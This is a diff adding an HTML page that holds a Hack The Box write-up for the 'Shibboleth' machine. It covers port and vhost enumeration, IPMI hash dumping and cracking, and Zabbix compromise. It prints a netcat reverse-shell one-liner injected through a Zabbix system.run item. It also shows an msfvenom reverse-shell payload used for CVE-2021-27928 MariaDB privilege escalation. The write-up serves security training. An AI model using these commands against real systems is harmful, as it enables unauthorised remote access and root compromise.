@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+      
+    <meta name="twitter:title" content="Shibboleth">
+    <meta name="twitter:description" content="10.10.10.158 - [MEDIUM] Json by Altelus">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:image" content="https://altelus1.github.ioimages/shibboleth/1.png" />
+    
+    <meta property="og:image" content="images/shibboleth/1.png">
+    <meta property="og:description" content="10.10.10.158 - [MEDIUM] Json by Altelus">
+    <title>Shibboleth</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Shibboleth" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/writeups/htb/boxes/Shibboleth.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/htb/boxes/Shibboleth.html" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Shibboleth" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Shibboleth","url":"http://localhost:4000/writeups/htb/boxes/Shibboleth.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+
+
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">Home</a></li><li><a href="/about.html">About</a></li><li><a href="/writeups/">Writeups</a></li><li><a href="/projects/">Projects</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="medium-shibboleth-">[MEDIUM] Shibboleth <br /></h1>
+
+<p><img src="images/shibboleth/1.png# icon" alt="Shibboleth icon" /></p>
+
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">NMAP</h3>
+
+<p>Starting to port scan using nmap. The following command is used to check the open ports only.
+<br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.124 <span class="nt">-vvv</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="s2">"Discovered open"</span> | <span class="nb">awk</span> <span class="s1">'{ print $4 }'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"/"</span> <span class="nt">-f</span> 1
+</code></pre></div></div>
+<p><br />Then the output is them passed to another nmap scan but this time it will do banner grabbing.
+<br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c"># Nmap 7.91 scan initiated Tue Mar 15 12:27:25 2022 as: nmap -sV -sC -p 80 -vvv -oA nmap-output-services.tcp 10.10.11.124</span>
+Nmap scan report <span class="k">for </span>shibboleth.htb <span class="o">(</span>10.10.11.124<span class="o">)</span>
+Host is up, received echo-reply ttl 63 <span class="o">(</span>0.35s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-03-15 12:27:25 EDT <span class="k">for </span>15s
+
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: FlexStart Bootstrap Template - Index
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Tue Mar 15 12:27:40 2022 -- 1 IP address (1 host up) scanned in 14.81 seconds</span>
+
+</code></pre></div></div>
+<p><br />Quite unusual for an HTB box but it only has one open port which is port 80. This is the snip of the fron page looks like.<br />
+<img src="images/shibboleth/2.png" alt="Shibboleth Front Page" />
+<br />There is nothing here but a simple static page. Next is to try guessing any virtual hosts. I used ffuf.
+<br /></p>
+<h3 id="vhost-enumeration">VHOST Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> http://shibboleth.htb/ <span class="se">\</span>
+    <span class="nt">-w</span> &lt;<span class="o">&gt;</span>/Discovery/DNS/subdomains-top1million-110000.txt <span class="se">\</span>
+    <span class="nt">-H</span> Host: FUZZ.shibboleth.htb <span class="nt">-o</span> vhosts <span class="nt">-fc</span> 302
+</code></pre></div></div>
+<p><br /> <code class="language-plaintext highlighter-rouge">-fc 302</code> is added since without it any subdomain send to the server will redirect to the main site. We have to filter out status codes 302. Once the scan is finished, here is the result from the output file:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>ffuf/vhost/vhosts | jq | <span class="nb">grep </span>shibboleth.htb | <span class="nb">grep</span> <span class="s2">"host"</span>
+</code></pre></div></div>
+<p><br /><img src="images/shibboleth/3.png" alt="Shibboleth vhosts" />
+<br />As can be seen, 3 subdomains can be seen:</p>
+<ul>
+  <li>zabbix.shibboleth.htb</li>
+  <li>monitor.shibboleth.htb</li>
+  <li>monitoring.shibboleth.htb</li>
+</ul>
+
+<p><br />This is what they all look like when visited.<br />
+<img src="images/shibboleth/4.png" alt="Shibboleth vhosts front page" /></p>
+
+<h3 id="udp-scanning">UDP Scanning</h3>
+<p>We don’t have any credentials to enter in the login page. Simple admin/password and other usual creds and even default zabbix username password (Admin/zabbix) doesn’t work. We have to enumerate the box more. UDP enumeration hasn’t been done yet.
+<br />Using the following command to enumerate UDP:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--min-rate</span> 10000 shibboleth.htb <span class="nt">-vvv</span> 
+</code></pre></div></div>
+<p><br />Port 623 is open.<br />
+<img src="images/shibboleth/5.png# medium" alt="Port UDP 623 open" />
+<br />Next step is to banner grab.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-sC</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-p</span> 623 shibboleth.htb <span class="nt">-vvv</span>
+</code></pre></div></div>
+<p><br /><img src="images/shibboleth/6.png# medium" alt="623 result" />
+<br />Looks like nmap doesn’t showed much result that is needed. Looking from this <a href="https://www.speedguide.net/port.php?port=623">site</a>, it seems that this is an IPMI service. Also <a href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi">hacktricks</a> has a great amount of information on how to enumerate and exploit this kind if service.
+<br />We can use the metasploit console and IPMI modules 
+<br /></p>
+
+<h3 id="exploiting-ipmi-service">Exploiting IPMI Service</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use auxiliary/scanner/ipmi/ipmi_version 
+msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_version<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts shibboleth.htb
+msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_version<span class="o">)</span> <span class="o">&gt;</span> run
+</code></pre></div></div>
+<p><br /><img src="images/shibboleth/7.png" alt="msfconsole ipmi version" />
+<br />We want to check if the IPMI service is vulnerable to cipher 0. 
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_version<span class="o">)</span> <span class="o">&gt;</span> use auxiliary/scanner/ipmi/ipmi_cipher_zero
+msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_cipher_zero<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts shibboleth.htb
+msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_cipher_zero<span class="o">)</span> <span class="o">&gt;</span> run
+</code></pre></div></div>
+<p><br /><img src="images/shibboleth/8.png" alt="msfconsole ipmi cipher zero" />
+<br />As can be seen it is vulnerable. Let’s dump the hashes.
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_cipher_zero<span class="o">)</span> <span class="o">&gt;</span> use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_dumphashes<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts shibboleth.htb
+msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_dumphashes<span class="o">)</span> <span class="o">&gt;</span> run
+</code></pre></div></div>
+<p><br /><img src="images/shibboleth/9.png" alt="msfconsole dump hashes" />
+<br />We can save the hash part and try cracking it with hashcat
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 7300 <span class="nt">-a</span> 0 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p><br />In hashcat the mode for IPMI2 RAKP HMAC-SHA1 is 7300.
+<br /><img src="images/shibboleth/10.png" alt="hashcat crack" /></p>
+
+<h3 id="logging-in-into-zabbix-dashboard">Logging In into Zabbix Dashboard</h3>
+<p>Creds is <code class="language-plaintext highlighter-rouge">Administrator:ilovepumkinpie1</code>. We can test this credentials on the vhosts discovered.
+<br /><img src="images/shibboleth/11.png" alt="zabbix login" />
+<br />As can be seen the creds worked.</p>
+
+<h3 id="running-script-items-in-zabbix-dashboard">Running Script Items in Zabbix Dashboard</h3>
+
+<p>In <a href="https://www.zabbix.com/documentation/5.0/en/manual/config/items/itemtypes/zabbix_agent">Zabbix documentation</a>, you can create an item with a supported key <code class="language-plaintext highlighter-rouge">system.run</code> that executes command on zabbix agent. To do this, from the home dashboard, go to <code class="language-plaintext highlighter-rouge">Configuration</code>
+<br /><img src="images/shibboleth/12.png# medium-p" alt="conf" />
+<br />Then, select <code class="language-plaintext highlighter-rouge">Hosts</code>
+<br /><img src="images/shibboleth/13.png# medium-p" alt="conf" />
+<br />Then the Hosts page will be loaded. There will be list of hosts and in this case there is only one which is <code class="language-plaintext highlighter-rouge">shibboleth.htb</code>. Click the <code class="language-plaintext highlighter-rouge">items</code>
+<br /><img src="images/shibboleth/14.png# medium" alt="conf" />
+<br />Then on the upper left, there is an button <code class="language-plaintext highlighter-rouge">Create Item</code>. Click it.
+<br /><img src="images/shibboleth/15.png# medium" alt="conf" />
+<br />A form will pop up. The Name field can be of any value. The important here is the key. The following Key value is set: <code class="language-plaintext highlighter-rouge">system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.31 9999 &gt;/tmp/f, nowait]</code>. This is a reverse shell
+<br /><img src="images/shibboleth/16.png# medium" alt="conf" />
+<br />To execute it, Select Test…
+<br /><img src="images/shibboleth/17.png# medium" alt="conf" />
+<br />…then click <code class="language-plaintext highlighter-rouge">Get value and Test</code>. It should execute the command. 
+<br /><img src="images/shibboleth/18.png# medium" alt="conf" />
+<br /><img src="images/shibboleth/19.png# medium" alt="conf" /></p>
+
+<h3 id="whoami-and-privesc-to-ipmi-svc">Whoami and Privesc to ipmi-svc</h3>
+
+<p>After turning the shell into an interactive TTY, we can now snoop around. Turns out we are <code class="language-plaintext highlighter-rouge">zabbix</code> as user but the user goal for this is <code class="language-plaintext highlighter-rouge">ipmi-svc</code>.
+<br /><img src="images/shibboleth/20.png" alt="user zabbix" />
+<br />We need to privesc to <code class="language-plaintext highlighter-rouge">ipmi-svc</code>. Trying the same password from the Zabbix dashboard. <code class="language-plaintext highlighter-rouge">ipmi-svc:ilovepumkinpie1</code>
+<br /><img src="images/shibboleth/21.png# medium" alt="user ipmi-svc" />
+<br />It turns out same password was used. We got user.</p>
+
+<h2 id="root-privesc">Root Privesc</h2>
+
+<h3 id="zabbix-configuration-in-etczabbix">Zabbix configuration in /etc/zabbix</h3>
+<p>Checking the environmental variables of <code class="language-plaintext highlighter-rouge">ipmi-svc</code> there is a zabbix conf in one of them
+<br /><img src="images/shibboleth/22.png# medium" alt="user ipmi-svc" />.
+<br />Let’s check if there are other configuration files we can look at in <code class="language-plaintext highlighter-rouge">/etc/zabbix</code>
+<br /><img src="images/shibboleth/23.png# medium" alt="user ipmi-svc" />
+<br />The last 2 files seems to be interesting and can only be read by ipmi-svc. Turns out this conf has mysql password and username.
+<br /><img src="images/shibboleth/24.png# medium" alt="user ipmi-svc" />
+<br />Let’s try this creds on mysql: <code class="language-plaintext highlighter-rouge">zabbix:bloooarskybluh</code>
+<br /><img src="images/shibboleth/25.png# medium" alt="user ipmi-svc" />
+<br />Nice! The creds worked. Notice that the copyright is in 2000, 2018. This mariadb may be out of date and possibly vulnerable.</p>
+
+<h3 id="running-processes---mysql">Running Processes - Mysql</h3>
+<p>When running <code class="language-plaintext highlighter-rouge">ps -aef --forest</code>, it can be seen that the mysql server is running as root.
+<br /><img src="images/shibboleth/26.png" alt="user ipmi-svc" />
+<br />We also noticed that the mysql may be out of date. Let’s check then if there are any existing exploit for mysql MariaDB <code class="language-plaintext highlighter-rouge">10.3.25 MariaDB</code>. Turns out an <a href="https://github.com/Al1ex/CVE-2021-27928">exploit procedure exists - CVE-2021-27928</a> for this version of mysql MariaDB.</p>
+
+<h3 id="mysql-exploitation-cve-2021-27928">Mysql Exploitation (CVE-2021-27928)</h3>
+<p>Following the exploitation process. Creating the .so through msfvenom
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.15 <span class="nv">LPORT</span><span class="o">=</span>10000 <span class="nt">-f</span> elf-so <span class="nt">-o</span> CVE-2021-27928.so
+</code></pre></div></div>
+<p><br /><img src="images/shibboleth/27.png" alt="user ipmi-svc" />
+<br />Now we have to transfer the .so file to the target host. We can serve it through http.server. After getting it we have to login to mysql and set wsrap_provider to the .so file. We should be able to execute commands as root
+<br /><img src="images/shibboleth/28.png" alt="user ipmi-svc" />
+<br /><img src="images/shibboleth/29.png# medium" alt="user ipmi-svc" />
+<br />The exploit worked! We have pwned the Shibboleth Machine.</p>
+
+<p><br />
+<br />
+<br />
+<br /></p>
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
